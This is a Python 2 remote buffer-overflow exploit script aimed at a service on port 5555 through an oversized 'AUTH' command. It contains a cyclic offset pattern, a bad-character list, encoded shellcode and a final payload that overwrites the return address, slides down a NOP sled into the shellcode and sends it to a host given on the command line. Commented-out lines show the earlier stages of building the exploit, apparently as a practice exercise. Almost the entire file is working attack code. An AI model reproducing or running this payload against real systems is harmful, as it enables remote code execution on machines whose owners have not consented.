#!/usr/bin/python
import time, struct, sys
import socket as so

#uniquestring = ( " Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6B " )


badchars = ( 

"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

shellcode = (
"\xbf\xe0\xcf\xb3\xeb\xda\xd6\xd9\x74\x24\xf4\x5a\x33\xc9" +
"\xb1\x4f\x83\xea\xfc\x31\x7a\x10\x03\x7a\x10\x02\x3a\x4f" +
"\x03\x4b\xc5\xb0\xd4\x2b\x4f\x55\xe5\x79\x2b\x1d\x54\x4d" +
"\x3f\x73\x55\x26\x6d\x60\xee\x4a\xba\x87\x47\xe0\x9c\xa6" +
"\x58\xc5\x20\x64\x9a\x44\xdd\x77\xcf\xa6\xdc\xb7\x02\xa7" +
"\x19\xa5\xed\xf5\xf2\xa1\x5c\xe9\x77\xf7\x5c\x08\x58\x73" +
"\xdc\x72\xdd\x44\xa9\xc8\xdc\x94\x02\x47\x96\x0c\x28\x0f" +
"\x07\x2c\xfd\x4c\x7b\x67\x8a\xa6\x0f\x76\x5a\xf7\xf0\x48" +
"\xa2\x5b\xcf\x64\x2f\xa2\x17\x42\xd0\xd1\x63\xb0\x6d\xe1" +
"\xb7\xca\xa9\x64\x2a\x6c\x39\xde\x8e\x8c\xee\xb8\x45\x82" +
"\x5b\xcf\x02\x87\x5a\x1c\x39\xb3\xd7\xa3\xee\x35\xa3\x87" +
"\x2a\x1d\x77\xa6\x6b\xfb\xd6\xd7\x6c\xa3\x87\x7d\xe6\x46" +
"\xd3\x07\xa5\x0e\x10\x35\x56\xcf\x3e\x4e\x25\xfd\xe1\xe4" +
"\xa1\x4d\x69\x22\x35\xb1\x40\x92\xa9\x4c\x6b\xe2\xe0\x8a" +
"\x3f\xb2\x9a\x3b\x40\x59\x5b\xc3\x95\xcd\x0b\x6b\x46\xad" +
"\xfb\xcb\x36\x45\x16\xc4\x69\x75\x19\x0e\x1c\xb2\x8e\x71" +
"\xb7\x32\x8f\x1a\xca\x4a\x0e\x60\x43\xac\x7a\x86\x02\x67" +
"\x13\x3f\x0f\xf3\x82\xc0\x85\x93\x27\x52\x42\x63\x21\x4f" +
"\xdd\x34\x66\xa1\x14\xd0\x9a\x98\x8e\xc6\x66\x7c\xe8\x42" +
"\xbd\xbd\xf7\x4b\x30\xf9\xd3\x5b\x8c\x02\x58\x0f\x40\x55" +
"\x36\xf9\x26\x0f\xf8\x53\xf1\xfc\x52\x33\x84\xce\x64\x45" +
"\x89\x1a\x13\xa9\x38\xf3\x62\xd6\xf5\x93\x62\xaf\xeb\x03" +
"\x8c\x7a\xa8\x24\x6f\xae\xc5\xcc\x36\x3b\x64\x91\xc8\x96" +
"\xab\xac\x4a\x12\x54\x4b\x52\x57\x51\x17\xd4\x84\x2b\x08" +
"\xb1\xaa\x98\x29\x90" )

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

# req1 = "AUTH " + "A"*1040 + "B" * 4 + "C" * (3500-1040-4) 
# req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" +  "C" * (1072-1040-4)
req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x90" * 16 + shellcode

# "\x90" * 16 + shellcode * (3500-1040-16-341-4)
# req1 = "AUTH " + uniquestring 
# req1 = "AUTH " + "A"*1040 + "B" * 4 + badchars
# req1 = "AUTH " + "A"*1040 + "B" * 4 + "\

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
    s.connect((server, port))
    print repr(s.recv(1024))
    s.send(req1)
    print repr(s.recv(1024))
except:
    print "[!] connection refused, check debugger"
    s.close()
